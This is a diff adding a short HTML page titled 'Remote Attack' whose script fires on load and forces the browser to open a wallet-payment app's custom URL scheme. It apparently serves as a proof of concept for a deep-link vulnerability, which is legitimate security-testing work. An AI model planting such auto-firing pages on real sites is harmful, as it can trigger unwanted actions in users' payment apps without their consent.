@@ -1,0 +1,13 @@
+</head>
+<body>
+<h1><div id="content">Remote Attack </div></h1>
+
+<script>	
+function attack(){
+
+    document.location.href ="walletinnerpay://123/";
+}
+attack();
+</script>
+
+</html>
